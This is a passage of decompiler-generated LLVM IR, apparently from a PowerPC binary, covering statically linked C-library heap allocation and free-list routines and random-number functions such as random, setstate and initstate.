  %v1_1000b2f8 = inttoptr i32 %arg2 to i32*
  %v2_1000b2f8 = load i32, i32* %v1_1000b2f8, align 4
  %v1_1000b2fc = add i32 %v2_1000b2f8, 3
  store i32 %v1_1000b2fc, i32* %r9.global-to-local, align 4
  %v1_1000b300 = call i32 @__asm_rlwinm(i32 %v1_1000b2fc, i32 0, i32 0, i32 29)
  %v2_1000b304 = icmp ugt i32 %v1_1000b300, 11
  br i1 %v2_1000b304, label %dec_label_pc_1000b388.preheader, label %dec_label_pc_1000b30c

dec_label_pc_1000b30c:                            ; preds = %entry
  br label %dec_label_pc_1000b388.preheader

dec_label_pc_1000b388.preheader:                  ; preds = %entry, %dec_label_pc_1000b30c
  %storemerge20 = phi i32 [ 12, %dec_label_pc_1000b30c ], [ %v1_1000b300, %entry ]
  %v0_1000b36c = phi i32 [ 12, %dec_label_pc_1000b30c ], [ %v1_1000b300, %entry ]
  store i32 %storemerge20, i32* %r11.global-to-local, align 4
  %storemerge2 = load i32, i32* %arg1, align 4
  store i32 %storemerge2, i32* %r9.global-to-local, align 4
  %v3_1000b3885 = icmp eq i32 %storemerge2, 0
  br i1 %v3_1000b3885, label %dec_label_pc_1000b390, label %dec_label_pc_1000b318

dec_label_pc_1000b318:                            ; preds = %dec_label_pc_1000b388.preheader, %dec_label_pc_1000b384
  %v0_1000b384 = phi i32 [ %storemerge, %dec_label_pc_1000b384 ], [ %storemerge2, %dec_label_pc_1000b388.preheader ]
  %v1_1000b318 = inttoptr i32 %v0_1000b384 to i32*
  %v2_1000b318 = load i32, i32* %v1_1000b318, align 4
  store i32 %v2_1000b318, i32* %r10.global-to-local, align 4
  %v2_1000b31c = icmp ult i32 %v2_1000b318, %v0_1000b36c
  br i1 %v2_1000b31c, label %dec_label_pc_1000b384, label %dec_label_pc_1000b324

dec_label_pc_1000b324:                            ; preds = %dec_label_pc_1000b318
  %v1_1000b324 = add i32 %v0_1000b36c, 44
  %v2_1000b328 = icmp ult i32 %v2_1000b318, %v1_1000b324
  br i1 %v2_1000b328, label %dec_label_pc_1000b330, label %dec_label_pc_1000b36c

dec_label_pc_1000b330:                            ; preds = %dec_label_pc_1000b324
  %v1_1000b330 = add i32 %v0_1000b384, 4
  %v2_1000b330 = inttoptr i32 %v1_1000b330 to i32*
  %v3_1000b330 = load i32, i32* %v2_1000b330, align 4
  store i32 %v3_1000b330, i32* %r11.global-to-local, align 4
  %v3_1000b334 = icmp eq i32 %v3_1000b330, 0
  br i1 %v3_1000b334, label %dec_label_pc_1000b344, label %dec_label_pc_1000b33c

dec_label_pc_1000b33c:                            ; preds = %dec_label_pc_1000b330
  %v1_1000b33c = add i32 %v0_1000b384, 8
  %v2_1000b33c = inttoptr i32 %v1_1000b33c to i32*
  %v3_1000b33c = load i32, i32* %v2_1000b33c, align 4
  %v2_1000b340 = add i32 %v3_1000b330, 8
  %v3_1000b340 = inttoptr i32 %v2_1000b340 to i32*
  store i32 %v3_1000b33c, i32* %v3_1000b340, align 4
  %v0_1000b344.pre = load i32, i32* %r9.global-to-local, align 4
  %v0_1000b360.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000b344

dec_label_pc_1000b344:                            ; preds = %dec_label_pc_1000b330, %dec_label_pc_1000b33c
  %v0_1000b360 = phi i32 [ %v2_1000b318, %dec_label_pc_1000b330 ], [ %v0_1000b360.pre, %dec_label_pc_1000b33c ]
  %v0_1000b344 = phi i32 [ %v0_1000b384, %dec_label_pc_1000b330 ], [ %v0_1000b344.pre, %dec_label_pc_1000b33c ]
  %v1_1000b344 = add i32 %v0_1000b344, 8
  %v2_1000b344 = inttoptr i32 %v1_1000b344 to i32*
  %v3_1000b344 = load i32, i32* %v2_1000b344, align 4
  store i32 %v3_1000b344, i32* @r8, align 4
  %v1_1000b348 = add i32 %v0_1000b344, 4
  %v2_1000b348 = inttoptr i32 %v1_1000b348 to i32*
  %v3_1000b348 = load i32, i32* %v2_1000b348, align 4
  %v3_1000b34c = icmp eq i32 %v3_1000b344, 0
  store i32 %v0_1000b360, i32* %r11.global-to-local, align 4
  br i1 %v3_1000b34c, label %dec_label_pc_1000b360, label %dec_label_pc_1000b354

dec_label_pc_1000b354:                            ; preds = %dec_label_pc_1000b344
  %v2_1000b358 = add i32 %v3_1000b344, 4
  %v3_1000b358 = inttoptr i32 %v2_1000b358 to i32*
  store i32 %v3_1000b348, i32* %v3_1000b358, align 4
  br label %dec_label_pc_1000b374

dec_label_pc_1000b360:                            ; preds = %dec_label_pc_1000b344
  store i32 %v3_1000b348, i32* %arg1, align 4
  br label %dec_label_pc_1000b374

dec_label_pc_1000b36c:                            ; preds = %dec_label_pc_1000b324
  %v2_1000b36c = sub i32 %v2_1000b318, %v0_1000b36c
  store i32 %v2_1000b36c, i32* %v1_1000b318, align 4
  br label %dec_label_pc_1000b374

dec_label_pc_1000b374:                            ; preds = %dec_label_pc_1000b360, %dec_label_pc_1000b354, %dec_label_pc_1000b36c
  %v0_1000b374 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000b374 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000b374 = sub i32 %v1_1000b374, %v0_1000b374
  store i32 %v2_1000b374, i32* %r9.global-to-local, align 4
  %v0_1000b378 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1000b378, i32* %v1_1000b2f8, align 4
  %v0_1000b37c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000b37c = add i32 %v0_1000b37c, 12
  ret i32 %v1_1000b37c

dec_label_pc_1000b384:                            ; preds = %dec_label_pc_1000b318
  %v1_1000b384 = add i32 %v0_1000b384, 4
  %storemerge.in = inttoptr i32 %v1_1000b384 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v3_1000b388 = icmp eq i32 %storemerge, 0
  br i1 %v3_1000b388, label %dec_label_pc_1000b388.dec_label_pc_1000b390_crit_edge, label %dec_label_pc_1000b318

dec_label_pc_1000b388.dec_label_pc_1000b390_crit_edge: ; preds = %dec_label_pc_1000b384
  br label %dec_label_pc_1000b390

dec_label_pc_1000b390:                            ; preds = %dec_label_pc_1000b388.dec_label_pc_1000b390_crit_edge, %dec_label_pc_1000b388.preheader
  ret i32 0

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_1000b344, { 1, 0 }
  uselistorder i32 %v2_1000b318, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_1000b384, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_1000b36c, { 1, 2, 0 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 5, 4, 6, 3 }
  uselistorder i32* %r11.global-to-local, { 3, 1, 2, 0 }
  uselistorder i32* %r10.global-to-local, { 1, 0, 2 }
  uselistorder i32* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1000b374, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000b344, { 1, 0 }
  uselistorder label %dec_label_pc_1000b318, { 1, 0 }
  uselistorder label %dec_label_pc_1000b388.preheader, { 1, 0 }
}

define i32 @__heap_alloc_at(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_1000b398 = load i32, i32* %arg1, align 4
  store i32 %v2_1000b398, i32* %r11.global-to-local, align 4
  store i32 %tmp, i32* @r8, align 4
  %v1_1000b3a0 = add i32 %arg3, 3
  %v3_1000b4243 = icmp eq i32 %v2_1000b398, 0
  br i1 %v3_1000b4243, label %dec_label_pc_1000b42c, label %dec_label_pc_1000b3a8

dec_label_pc_1000b3a8:                            ; preds = %entry, %dec_label_pc_1000b420
  %v0_1000b420 = phi i32 [ %v3_1000b420, %dec_label_pc_1000b420 ], [ %v2_1000b398, %entry ]
  %v1_1000b3a8 = inttoptr i32 %v0_1000b420 to i32*
  %v2_1000b3a8 = load i32, i32* %v1_1000b3a8, align 4
  %v2_1000b3ac = sub i32 %v0_1000b420, %v2_1000b3a8
  %v1_1000b3b0 = add i32 %v2_1000b3ac, 12
  %v3_1000b3b4 = icmp ugt i32 %v1_1000b3b0, %arg2
  br i1 %v3_1000b3b4, label %dec_label_pc_1000b420, label %dec_label_pc_1000b3bc

dec_label_pc_1000b3bc:                            ; preds = %dec_label_pc_1000b3a8
  %v4_1000b3b4 = icmp eq i32 %v1_1000b3b0, %arg2
  br i1 %v4_1000b3b4, label %dec_label_pc_1000b3c4, label %dec_label_pc_1000b42c

dec_label_pc_1000b3c4:                            ; preds = %dec_label_pc_1000b3bc
  %v1_1000b3c4 = call i32 @__asm_rlwinm(i32 %v1_1000b3a0, i32 0, i32 0, i32 29)
  %v2_1000b3c8 = icmp ult i32 %v2_1000b3a8, %v1_1000b3c4
  br i1 %v2_1000b3c8, label %dec_label_pc_1000b42c, label %dec_label_pc_1000b3d0

dec_label_pc_1000b3d0:                            ; preds = %dec_label_pc_1000b3c4
  %v1_1000b3d0 = add i32 %v1_1000b3c4, 44
  %v2_1000b3d4 = icmp ult i32 %v2_1000b3a8, %v1_1000b3d0
  br i1 %v2_1000b3d4, label %dec_label_pc_1000b3dc, label %dec_label_pc_1000b410

dec_label_pc_1000b3dc:                            ; preds = %dec_label_pc_1000b3d0
  %v0_1000b3dc = load i32, i32* %r11.global-to-local, align 4
  %v1_1000b3dc = add i32 %v0_1000b3dc, 4
  %v2_1000b3dc = inttoptr i32 %v1_1000b3dc to i32*
  %v3_1000b3dc = load i32, i32* %v2_1000b3dc, align 4
  %v3_1000b3e0 = icmp eq i32 %v3_1000b3dc, 0
  br i1 %v3_1000b3e0, label %dec_label_pc_1000b3f0, label %dec_label_pc_1000b3e8

dec_label_pc_1000b3e8:                            ; preds = %dec_label_pc_1000b3dc
  %v1_1000b3e8 = add i32 %v0_1000b3dc, 8
  %v2_1000b3e8 = inttoptr i32 %v1_1000b3e8 to i32*
  %v3_1000b3e8 = load i32, i32* %v2_1000b3e8, align 4
  %v2_1000b3ec = add i32 %v3_1000b3dc, 8
  %v3_1000b3ec = inttoptr i32 %v2_1000b3ec to i32*
  store i32 %v3_1000b3e8, i32* %v3_1000b3ec, align 4
  %v0_1000b3f0.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000b3f0

dec_label_pc_1000b3f0:                            ; preds = %dec_label_pc_1000b3dc, %dec_label_pc_1000b3e8
  %v0_1000b3f0 = phi i32 [ %v0_1000b3dc, %dec_label_pc_1000b3dc ], [ %v0_1000b3f0.pre, %dec_label_pc_1000b3e8 ]
  %v1_1000b3f0 = add i32 %v0_1000b3f0, 8
  %v2_1000b3f0 = inttoptr i32 %v1_1000b3f0 to i32*
  %v3_1000b3f0 = load i32, i32* %v2_1000b3f0, align 4
  %v1_1000b3f4 = add i32 %v0_1000b3f0, 4
  %v2_1000b3f4 = inttoptr i32 %v1_1000b3f4 to i32*
  %v3_1000b3f4 = load i32, i32* %v2_1000b3f4, align 4
  %v3_1000b3f8 = icmp eq i32 %v3_1000b3f0, 0
  br i1 %v3_1000b3f8, label %dec_label_pc_1000b408, label %dec_label_pc_1000b400

dec_label_pc_1000b400:                            ; preds = %dec_label_pc_1000b3f0
  %v2_1000b400 = add i32 %v3_1000b3f0, 4
  %v3_1000b400 = inttoptr i32 %v2_1000b400 to i32*
  store i32 %v3_1000b3f4, i32* %v3_1000b400, align 4
  ret i32 %v2_1000b3a8

dec_label_pc_1000b408:                            ; preds = %dec_label_pc_1000b3f0
  %v1_1000b408 = load i32, i32* @r8, align 4
  %v2_1000b408 = inttoptr i32 %v1_1000b408 to i32*
  store i32 %v3_1000b3f4, i32* %v2_1000b408, align 4
  ret i32 %v2_1000b3a8

dec_label_pc_1000b410:                            ; preds = %dec_label_pc_1000b3d0
  %v2_1000b410 = sub i32 %v2_1000b3a8, %v1_1000b3c4
  %v1_1000b418 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000b418 = inttoptr i32 %v1_1000b418 to i32*
  store i32 %v2_1000b410, i32* %v2_1000b418, align 4
  ret i32 %v1_1000b3c4

dec_label_pc_1000b420:                            ; preds = %dec_label_pc_1000b3a8
  %v1_1000b420 = add i32 %v0_1000b420, 4
  %v2_1000b420 = inttoptr i32 %v1_1000b420 to i32*
  %v3_1000b420 = load i32, i32* %v2_1000b420, align 4
  store i32 %v3_1000b420, i32* %r11.global-to-local, align 4
  %v3_1000b424 = icmp eq i32 %v3_1000b420, 0
  br i1 %v3_1000b424, label %dec_label_pc_1000b424.dec_label_pc_1000b42c.loopexit_crit_edge, label %dec_label_pc_1000b3a8

dec_label_pc_1000b424.dec_label_pc_1000b42c.loopexit_crit_edge: ; preds = %dec_label_pc_1000b420
  br label %dec_label_pc_1000b42c

dec_label_pc_1000b42c:                            ; preds = %entry, %dec_label_pc_1000b424.dec_label_pc_1000b42c.loopexit_crit_edge, %dec_label_pc_1000b3bc, %dec_label_pc_1000b3c4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_1000b420, { 1, 2, 0 }
  uselistorder i32 %v0_1000b3f0, { 1, 0 }
  uselistorder i32 %v1_1000b3c4, { 2, 1, 0, 3 }
  uselistorder i32 %v2_1000b3a8, { 4, 2, 1, 0, 3, 5 }
  uselistorder i32 %v0_1000b420, { 0, 2, 1 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_1000b42c, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_1000b3f0, { 1, 0 }
  uselistorder label %dec_label_pc_1000b3a8, { 1, 0 }
}

define i32 @__heap_link_free_area(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_1000b434 = icmp eq i32 %arg3, 0
  %v2_1000b438 = add i32 %arg2, 4
  %v3_1000b438 = inttoptr i32 %v2_1000b438 to i32*
  store i32 %arg4, i32* %v3_1000b438, align 4
  %v2_1000b43c = add i32 %arg2, 8
  %v3_1000b43c = inttoptr i32 %v2_1000b43c to i32*
  store i32 %arg3, i32* %v3_1000b43c, align 4
  br i1 %v3_1000b434, label %dec_label_pc_1000b44c, label %dec_label_pc_1000b444

dec_label_pc_1000b444:                            ; preds = %entry
  %v2_1000b444 = add i32 %arg3, 4
  %v3_1000b444 = inttoptr i32 %v2_1000b444 to i32*
  store i32 %arg2, i32* %v3_1000b444, align 4
  br label %dec_label_pc_1000b450

dec_label_pc_1000b44c:                            ; preds = %entry
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_1000b450

dec_label_pc_1000b450:                            ; preds = %dec_label_pc_1000b444, %dec_label_pc_1000b44c
  %v3_1000b450 = icmp eq i32 %arg4, 0
  %v0_1000b454 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000b450, i32 %v0_1000b454)
  %v2_1000b458 = add i32 %arg4, 8
  %v3_1000b458 = inttoptr i32 %v2_1000b458 to i32*
  store i32 %arg2, i32* %v3_1000b458, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %arg4, { 0, 2, 1 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg2, { 3, 1, 2, 0, 4 }
  uselistorder label %dec_label_pc_1000b450, { 1, 0 }
}

define i32 @__heap_link_free_area_after(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_1000b460 = icmp eq i32 %arg3, 0
  br i1 %v3_1000b460, label %dec_label_pc_1000b470, label %dec_label_pc_1000b468

dec_label_pc_1000b468:                            ; preds = %entry
  %v2_1000b468 = add i32 %arg3, 4
  %v3_1000b468 = inttoptr i32 %v2_1000b468 to i32*
  store i32 %arg2, i32* %v3_1000b468, align 4
  br label %dec_label_pc_1000b474

dec_label_pc_1000b470:                            ; preds = %entry
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_1000b474

dec_label_pc_1000b474:                            ; preds = %dec_label_pc_1000b468, %dec_label_pc_1000b470
  %v2_1000b474 = add i32 %arg2, 8
  %v3_1000b474 = inttoptr i32 %v2_1000b474 to i32*
  store i32 %arg3, i32* %v3_1000b474, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000b474, { 1, 0 }
}

define i32 @__heap_free(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r10.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v2_1000b494 = load i32, i32* %arg1, align 4
  store i32 %v2_1000b494, i32* @r31, align 4
  %v2_1000b498 = add i32 %arg3, %arg2
  store i32 %v2_1000b498, i32* %r3.global-to-local, align 4
  %v3_1000b4ac7 = icmp eq i32 %v2_1000b494, 0
  %v1_1000b4b08 = add i32 %v2_1000b494, 12
  %tmp69 = icmp uge i32 %v1_1000b4b08, %arg2
  %or.cond10 = or i1 %v3_1000b4ac7, %tmp69
  br i1 %or.cond10, label %dec_label_pc_1000b4bc, label %dec_label_pc_1000b4a4

dec_label_pc_1000b4a4:                            ; preds = %entry, %dec_label_pc_1000b4a4
  %v0_1000b50411 = phi i32 [ %v3_1000b4a8, %dec_label_pc_1000b4a4 ], [ %v2_1000b494, %entry ]
  store i32 %v0_1000b50411, i32* %r11.global-to-local, align 4
  %v1_1000b4a8 = add i32 %v0_1000b50411, 4
  %v2_1000b4a8 = inttoptr i32 %v1_1000b4a8 to i32*
  %v3_1000b4a8 = load i32, i32* %v2_1000b4a8, align 4
  store i32 %v3_1000b4a8, i32* @r31, align 4
  %v3_1000b4ac = icmp eq i32 %v3_1000b4a8, 0
  %v1_1000b4b0 = add i32 %v3_1000b4a8, 12
  %tmp6 = icmp uge i32 %v1_1000b4b0, %arg2
  %or.cond = or i1 %v3_1000b4ac, %tmp6
  br i1 %or.cond, label %dec_label_pc_1000b4bc, label %dec_label_pc_1000b4a4

dec_label_pc_1000b4bc:                            ; preds = %dec_label_pc_1000b4a4, %entry
  %v0_1000b4f8.lcssa = phi i32 [ 0, %entry ], [ %v0_1000b50411, %dec_label_pc_1000b4a4 ]
  %v0_1000b504.lcssa = phi i32 [ %v2_1000b494, %entry ], [ %v3_1000b4a8, %dec_label_pc_1000b4a4 ]
  %v3_1000b4ac.lcssa = phi i1 [ %v3_1000b4ac7, %entry ], [ %v3_1000b4ac, %dec_label_pc_1000b4a4 ]
  br i1 %v3_1000b4ac.lcssa, label %dec_label_pc_1000b574, label %dec_label_pc_1000b4c4

dec_label_pc_1000b4c4:                            ; preds = %dec_label_pc_1000b4bc
  %v1_1000b4c4 = inttoptr i32 %v0_1000b504.lcssa to i32*
  %v2_1000b4c4 = load i32, i32* %v1_1000b4c4, align 4
  %v2_1000b4c8 = sub i32 %v0_1000b504.lcssa, %v2_1000b4c4
  %v1_1000b4cc = add i32 %v2_1000b4c8, 12
  %v3_1000b4d0 = icmp ugt i32 %v1_1000b4cc, %v2_1000b498
  br i1 %v3_1000b4d0, label %dec_label_pc_1000b574, label %dec_label_pc_1000b4d8

dec_label_pc_1000b4d8:                            ; preds = %dec_label_pc_1000b4c4
  %v4_1000b4d0 = icmp eq i32 %v1_1000b4cc, %v2_1000b498
  %v2_1000b4dc = add i32 %v2_1000b4c4, %arg3
  store i32 %v2_1000b4dc, i32* @r29, align 4
  br i1 %v4_1000b4d0, label %dec_label_pc_1000b4e4, label %dec_label_pc_1000b514

dec_label_pc_1000b4e4:                            ; preds = %dec_label_pc_1000b4d8
  %v3_1000b4e4 = icmp eq i32 %v0_1000b4f8.lcssa, 0
  br i1 %v3_1000b4e4, label %dec_label_pc_1000b568, label %dec_label_pc_1000b4ec

dec_label_pc_1000b4ec:                            ; preds = %dec_label_pc_1000b4e4
  %v1_1000b4ec = add i32 %v0_1000b4f8.lcssa, 12
  %v4_1000b4f0 = icmp eq i32 %v1_1000b4ec, %arg2
  br i1 %v4_1000b4f0, label %dec_label_pc_1000b4f8, label %dec_label_pc_1000b568

dec_label_pc_1000b4f8:                            ; preds = %dec_label_pc_1000b4ec
  %v1_1000b4f8 = inttoptr i32 %v0_1000b4f8.lcssa to i32*
  %v2_1000b4f8 = load i32, i32* %v1_1000b4f8, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v1_1000b500 = add i32 %v0_1000b4f8.lcssa, 8
  %v2_1000b500 = inttoptr i32 %v1_1000b500 to i32*
  %v3_1000b500 = load i32, i32* %v2_1000b500, align 4
  %v2_1000b508 = add i32 %v2_1000b4f8, %v2_1000b4dc
  store i32 %v2_1000b508, i32* @r29, align 4
  %v5_1000b50c = call i32 @__heap_link_free_area_after(i32* %arg1, i32 %v0_1000b504.lcssa, i32 %v3_1000b500, i32 %v2_1000b498)
  store i32 %v5_1000b50c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000b568

dec_label_pc_1000b514:                            ; preds = %dec_label_pc_1000b4d8
  %v1_1000b514 = add i32 %v0_1000b504.lcssa, 4
  %v2_1000b514 = inttoptr i32 %v1_1000b514 to i32*
  %v3_1000b514 = load i32, i32* %v2_1000b514, align 4
  %v3_1000b518 = icmp eq i32 %v3_1000b514, 0
  br i1 %v3_1000b518, label %dec_label_pc_1000b550, label %dec_label_pc_1000b520

dec_label_pc_1000b520:                            ; preds = %dec_label_pc_1000b514
  %v1_1000b520 = inttoptr i32 %v3_1000b514 to i32*
  %v2_1000b520 = load i32, i32* %v1_1000b520, align 4
  %v2_1000b524 = sub i32 %v3_1000b514, %v2_1000b520
  %v1_1000b528 = add i32 %v2_1000b524, 12
  %v4_1000b52c = icmp eq i32 %v2_1000b498, %v1_1000b528
  br i1 %v4_1000b52c, label %dec_label_pc_1000b534, label %dec_label_pc_1000b550

dec_label_pc_1000b534:                            ; preds = %dec_label_pc_1000b520
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_1000b540 = add i32 %v2_1000b520, %v2_1000b4dc
  store i32 %v2_1000b540, i32* @r29, align 4
  store i32 %v3_1000b514, i32* @r31, align 4
  %v5_1000b548 = call i32 @__heap_link_free_area_after(i32* %arg1, i32 %v3_1000b514, i32 %v0_1000b4f8.lcssa, i32 %v2_1000b498)
  store i32 %v5_1000b548, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000b568

dec_label_pc_1000b550:                            ; preds = %dec_label_pc_1000b520, %dec_label_pc_1000b514
  %v2_1000b550 = add i32 %v0_1000b504.lcssa, %arg3
  store i32 %v2_1000b550, i32* @r31, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 268481896, i32* @lr, align 4
  %v5_1000b564 = call i32 @__heap_link_free_area(i32* %arg1, i32 %v2_1000b550, i32 %v0_1000b4f8.lcssa, i32 %v3_1000b514)
  store i32 %v5_1000b564, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000b568

dec_label_pc_1000b568:                            ; preds = %dec_label_pc_1000b4ec, %dec_label_pc_1000b4e4, %dec_label_pc_1000b534, %dec_label_pc_1000b4f8, %dec_label_pc_1000b550
  %v0_1000b568 = load i32, i32* @r31, align 4
  store i32 %v0_1000b568, i32* @r30, align 4
  %v0_1000b56c = load i32, i32* @r29, align 4
  %v2_1000b56c = inttoptr i32 %v0_1000b568 to i32*
  store i32 %v0_1000b56c, i32* %v2_1000b56c, align 4
  br label %dec_label_pc_1000b590

dec_label_pc_1000b574:                            ; preds = %dec_label_pc_1000b4c4, %dec_label_pc_1000b4bc
  %v2_1000b574 = add i32 %v2_1000b498, -12
  %v3_1000b574 = inttoptr i32 %v2_1000b574 to i32*
  store i32 %arg3, i32* %v3_1000b574, align 4
  %v0_1000b578 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000b578 = add i32 %v0_1000b578, -12
  store i32 %v1_1000b578, i32* @r30, align 4
  %v0_1000b57c = load i32, i32* %r11.global-to-local, align 4
  %v0_1000b580 = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_1000b580, i32* %r3.global-to-local, align 4
  %v0_1000b584 = load i32, i32* @r31, align 4
  store i32 268481936, i32* @lr, align 4
  %v4_1000b58c = inttoptr i32 %v0_1000b580 to i32*
  %v5_1000b58c = call i32 @__heap_link_free_area(i32* %v4_1000b58c, i32 %v1_1000b578, i32 %v0_1000b57c, i32 %v0_1000b584)
  store i32 %v5_1000b58c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000b590

dec_label_pc_1000b590:                            ; preds = %dec_label_pc_1000b568, %dec_label_pc_1000b574
  %v0_1000b594 = load i32, i32* @r30, align 4
  store i32 %v0_1000b594, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000b594

; uselistorder directives
  uselistorder i32 %v3_1000b514, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v1_1000b4cc, { 1, 0 }
  uselistorder i32 %v0_1000b504.lcssa, { 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_1000b4f8.lcssa, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %v3_1000b4a8, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v2_1000b498, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %tmp, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 8, 2, 6, 9, 3, 10, 4, 11, 5, 7, 0 }
  uselistorder i32* %r11.global-to-local, { 1, 0, 2 }
  uselistorder i32 -12, { 2, 3, 1, 4, 0 }
  uselistorder i32 %arg3, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 3, 2, 0, 1 }
  uselistorder i32* %arg1, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_1000b590, { 1, 0 }
  uselistorder label %dec_label_pc_1000b568, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_1000b4a4, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_1000b5a8 = call i32 @random()
  ret i32 %v0_1000b5a8

; uselistorder directives
  uselistorder i32 ()* @random, { 11, 10, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v2_1000b5c0 = ptrtoint i32* %stack_var_-52 to i32
  store i32 ptrtoint (i32* @global_var_100248e0.622 to i32), i32* @r29, align 4
  store i32 %v2_1000b5c0, i32* @r3, align 4
  %v0_1000b5d8 = call i32 @__pthread_return_void()
  %v0_1000b5e0 = call i32 @__pthread_return_0()
  %v2_1000b5e8 = ptrtoint i32* %stack_var_-56 to i32
  %v3_1000b5f0 = call i32 @__GI_random_r(i32* inttoptr (i32 268585208 to i32*), i32 %v2_1000b5e8)
  store i32 %v2_1000b5c0, i32* @r3, align 4
  %v0_1000b5fc = call i32 @__pthread_return_void()
  %v3_1000b604 = load i32, i32* %stack_var_-56, align 4
  ret i32 %v3_1000b604
}

define i32 @setstate(i32 %arg1) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_100248e0.622 to i32), i32* %r29.global-to-local, align 4
  %v2_1000b63c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000b63c, i32* @r3, align 4
  %v0_1000b644 = call i32 @__pthread_return_void()
  %v0_1000b64c = call i32 @__pthread_return_0()
  store i32 268482152, i32* @lr, align 4
  %v3_1000b664 = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_100248f8)
  store i32 0, i32* %r29.global-to-local, align 4
  %v1_1000b66c = icmp slt i32 %v3_1000b664, 0
  store i32 %v2_1000b63c, i32* @r3, align 4
  br i1 %v1_1000b66c, label %dec_label_pc_1000b680, label %dec_label_pc_1000b67c

dec_label_pc_1000b67c:                            ; preds = %entry
  store i32 ptrtoint (i32** @global_var_100248fc.626 to i32), i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000b680

dec_label_pc_1000b680:                            ; preds = %entry, %dec_label_pc_1000b67c
  %v0_1000b680 = call i32 @__pthread_return_void()
  %v0_1000b688 = load i32, i32* %r29.global-to-local, align 4
  ret i32 %v0_1000b688

; uselistorder directives
  uselistorder i32* %r29.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1000b680, { 1, 0 }
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i32, align 4
  %v2_1000b6ac = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1000b6ac, i32* @r3, align 4
  %v0_1000b6d4 = call i32 @__pthread_return_void()
  %v0_1000b6dc = call i32 @__pthread_return_0()
  store i32 %arg1, i32* @r3, align 4
  store i32 268482300, i32* @lr, align 4
  %v4_1000b6f8 = inttoptr i32 %arg1 to i32*
  %v5_1000b6f8 = call i32 @__GI_initstate_r(i32* %v4_1000b6f8, i32 %arg2, i32 %arg3, i32 ptrtoint (i32* @global_var_100248f8 to i32))
  store i32 %v2_1000b6ac, i32* @r3, align 4
  %v0_1000b704 = call i32 @__pthread_return_void()
  ret i32 ptrtoint (i32** @global_var_100248fc.626 to i32)

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
